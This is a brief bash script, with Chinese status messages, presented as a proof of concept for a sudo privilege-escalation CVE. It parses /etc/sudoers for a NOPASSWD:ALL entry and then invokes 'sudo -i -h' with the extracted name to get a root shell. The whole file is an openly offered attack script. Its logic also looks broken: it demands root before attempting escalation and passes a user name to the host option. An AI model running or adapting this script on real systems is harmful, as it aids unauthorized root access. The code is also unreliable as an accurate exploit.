#! /bin/bash
# CVE-2025-32462 - a easy Sudo PoC by cryingn.
check_sudoers() {
    while IFS= read -r line; do
        [[ "$line" =~ ^# ]] || [[ -z "$line" ]] && continue
        
        if [[ "$line" == *"NOPASSWD:ALL"* ]]; then
            prefix=${line%=*}
            user=$(echo "$prefix" | awk '{print $NF}')
	    echo $user
    	    return 0
	fi
    done < /etc/sudoers
}            

main() {
    if [[ $EUID -ne 0 ]]; then
        echo "错误: 此脚本需要root权限运行" 
        exit 1
    fi
    
    local user
    user=$(check_sudoers)
    if [[ -n "$user" ]]; then
    	sudo -i -h $user
    else
	echo "未找到可提权用户"
    fi
}

main "$@"
